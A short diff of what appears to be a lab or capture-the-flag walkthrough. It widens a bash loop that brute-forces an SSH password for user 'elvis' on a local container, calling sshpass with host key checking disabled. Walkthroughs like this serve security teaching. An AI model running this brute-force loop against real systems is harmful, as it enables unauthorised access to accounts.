@@ -158,7 +158,7 @@ You know that the password for elvis username is a 4 digit number. Simpliy tryin
 3. Execute the below bash script until you find the correct password.
 
 ```bash
-for i in $(seq 1000 3000); do
+for i in $(seq 1000 9999); do
   echo trying $i
   sshpass -p $i ssh -o StrictHostKeyChecking=no -p 2222 elvis@172.17.0.2
 done
